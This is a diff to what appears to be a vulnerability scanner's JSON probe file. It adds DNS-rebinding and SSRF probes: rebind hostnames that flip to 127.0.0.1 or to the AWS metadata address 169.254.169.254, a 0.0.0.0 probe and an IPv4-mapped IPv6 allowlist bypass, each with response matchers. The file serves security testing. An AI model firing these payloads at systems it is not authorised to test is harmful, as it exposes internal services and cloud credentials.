@@ -345,6 +345,126 @@
           "confidence_boost": 70
         }
       ]
+    },
+    "dns_rebind": {
+      "description": "TOCTOU SSRF via DNS rebinding -- attacker controls a domain that resolves to a public IP for the validation check then re-resolves to 169.254.169.254 / 127.0.0.1 / 10.0.0.0/8 for the actual fetch. Detection focuses on apps that re-resolve the hostname per request and have a non-zero gap between validate() and fetch(). Use a controlled rebind domain (e.g. rbndr.us, lock.cmpxchg8b.com/rebinder.html or a self-hosted CoreDNS with low TTL).",
+      "tech_match": [
+        "java",
+        "node",
+        "python",
+        "go",
+        "php"
+      ],
+      "param_match": [
+        "url",
+        "uri",
+        "callback",
+        "fetch",
+        "webhook",
+        "avatar",
+        "import_url",
+        "source_url"
+      ],
+      "probes": [
+        {
+          "payload": "http://7f000001.c0a80001.rbndr.us/",
+          "description": "rbndr.us alternates between 127.0.0.1 and 192.168.0.1 on consecutive resolves. If server fetches the URL and we see localhost banner / internal page in response, rebind succeeded.",
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "localhost",
+                "127.0.0.1",
+                "internal",
+                "admin",
+                "apache2 ubuntu default page"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                502,
+                503
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "http://make-127-0-0-1-rr-169-254-169-254.<COLLAB>/",
+          "description": "Custom rebind via Collaborator-controlled DNS: first query returns a public IP (passes SSRF validator), second query returns 169.254.169.254 (AWS IMDS). The Collaborator interaction count will show 2+ DNS queries with TTL=0. Replace <COLLAB> with the operator-provided callback domain (Rule 9a).",
+          "matchers": [
+            {
+              "type": "word",
+              "any": [
+                "ami-id",
+                "instance-id",
+                "iam",
+                "meta-data"
+              ]
+            },
+            {
+              "type": "collaborator",
+              "expect_dns_count_min": 2
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "requires_collaborator": true
+          }
+        },
+        {
+          "payload": "http://0.0.0.0/",
+          "description": "0.0.0.0 ambiguity probe -- on Linux this routes to localhost services bound to wildcard. Detection only -- if app fetches and returns a response that smells like an internal service, the URL parser does not reject 0.0.0.0.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                502
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "nginx",
+                "apache",
+                "gunicorn",
+                "kestrel",
+                "metrics"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "http://[::ffff:127.0.0.1]/",
+          "description": "IPv4-mapped IPv6 bypass for SSRF allowlists that only check IPv4 dotted-quad. Detection: app fetches and returns local-service content.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                502
+              ]
+            },
+            {
+              "type": "word",
+              "any": [
+                "localhost",
+                "127.0.0.1",
+                "internal"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
     }
   }
 }
